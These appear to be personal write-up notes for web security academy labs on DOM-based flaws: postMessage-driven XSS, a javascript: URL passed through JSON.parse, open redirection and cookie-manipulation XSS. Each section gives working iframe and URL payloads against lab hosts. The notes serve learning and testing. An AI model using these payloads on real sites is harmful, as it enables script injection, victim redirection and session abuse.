# Navigation
- [DOM XSS using web messages](#dom-xss-using-web-messages)
- [DOM XSS using web messages and a JavaScript URL](#dom-xss-using-web-messages-and-a-javascript-url)
- [DOM XSS using web messages and `JSON.parse`](#dom-xss-using-web-messages-and-jsonparse)
- [DOM-based open redirection](#dom-based-open-redirection)
- [DOM-based cookie manipulation](#dom-based-cookie-manipulation)
# DOM XSS using web messages
1. GET request on web root reveals the following inline script tag
```html
<script>
window.addEventListener('message', function(e) {
document.getElementById('ads').innerHTML = e.data;
})
</script>
```
- This script has got an event listener waiting for a message (which fires when the window receives a message)
- The script then adds the message it receives to the document element "ads" and uses `innerHTML` which writes its property as HTML which can be used for XSS
2. Note the target is also vulnerable to ClickJacking due to an absent X-Frame-Options or CSP header
3. Host the site in an iframe and send a web message when the page is loaded
	1. Remember to use `<img src=x` payloads for DOM XSS
```html
<iframe src="https://0a32004a03bada7f8124301900dd0001.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">
```
# DOM XSS using web messages and a JavaScript URL
1. GET request on web root reveals the following inline script tag
```html
<script>
	window.addEventListener('message', function(e) {
		var url = e.data;
		if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
			location.href = url;
		}
	}, false);
</script>
```
- This script has an event listener waiting for a message (which fires when the window receives a message)
- If the script receives any message containing `http:` or `https:` then it will assign the value to `location.href` (`> -1`) is guaranteed to be TRUE as long as `http:` or `https:` is present in the message data
2. Note the target is also vulnerable to ClickJacking due to an absent X-Frame-Options or CSP header
3. Host the site in a iframe and send a web message when the page is loaded containing `http:` in the message
```html
<iframe src="https://0adf00b104861aae80e9217b002c0076.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.domain)//http:','*')">
```
- There is also a second payload that can be used which triggers the same XSS payload
```html
<iframe src="https://0adf00b104861aae80e9217b002c0076.web-security-academy.net/" onload="this.contentWindow.postMessage(''-alert(document.domain)-'','*')">
```
- Oddly enough, this one fires without needing to include `http:` or `https:` in the payload
# DOM XSS using web messages and `JSON.parse`
1. View web root and identify inline JavaScript function that writes to the DOM
```html
<script>
window.addEventListener('message', function(e) {
	var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
document.body.appendChild(iframe);
try {
	d = JSON.parse(e.data);
	} catch(e) {
	return;
}
switch(d.type) {
	case "page-load":
		ACMEplayer.element.scrollIntoView();
	break;
	case "load-channel":
		ACMEplayer.element.src = d.url;
	break;
	case "player-height-changed":
		ACMEplayer.element.style.width = d.width + "px";
		ACMEplayer.element.style.height = d.height + "px";
	break;
	}
}, false);
```
- We can see that if we send a web message, our data will be passed to a `JSON.parse` method and then uses a switch statement which will run is a specific type is passed in the web message
- One of interest is the "load-channel" type which will pass our data to a URL. We can use this to send a payload `javascript:alert(document.domain)`
2. Note that the target is also vulnerable to ClickJacking so we can easily send a web message
3. Construct the following malicious page
```html
<iframe src="https://0a7f005d039ba0a6804ebc11003800d4.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print(document.domain)\"}","*")'>
```
# DOM-based open redirection
- Redirect victim to exploit server
1. Explore web app
2. Identify a DOM sink commonly associated with open redirection in the HTTP response of posts
```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```
- The `exec` method takes the URL object and finds the given pattern then assigns this value to the `returnUrl` variable
- It does not perform any checks on the URL given so we can create a malicious payload to by injecting `url=https://attacker.com` into the URL. This can be done using a fragment or a parameter
3. Construct a URL to control the `returnUrl` parameter
```
GET /post?postId=10&url=https://exploit-0a26005004679798803c0c6a011600e7.exploit-server.net/
```
# DOM-based cookie manipulation
- Trigger `print()` against victim
1. Viewing a product URL reveals the following inline JavaScript that sets a user's cookie
```html
<script>
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
- This script takes the user's `window.location` value (i.e. the current URL) and sets a cookie
2. Navigating back to the home page reveals a "Last viewed product" hyperlink which is set to the value of our `lastViewedProduct` cookie
```html
<a href="lastViewedProduct cookie value"
```
3. Change cookie value in the browser tools > Refresh the page > Observe the href attribute  does not filter the cookie value and reflects it in the DOM
4. Changing cookie value to `'><img src=x onerror=alert(document.domain)>` pops in our session
5. With this working value we need to test if we can set it using the product URL
```
https://0ac3002e03320d2282ca10ef00f400e1.web-security-academy.net/product?productId=3&'><img src=x onerror=alert(document.domain)>
```
6. Go back to the home page and observe that the DOM XSS payload pops
7. Note that the target URL is vulnerable to ClickJacking which we will use to construct an iframe so we can set the victim's cookie then redirect them to the homepage to pop them
```html
<iframe src="https://0ac3002e03320d2282ca10ef00f400e1.web-security-academy.net/product?productId=3&'><img src=x onerror=alert(document.domain)>" onload="window.location = 'https://0ac3002e03320d2282ca10ef00f400e1.web-security-academy.net/'">
```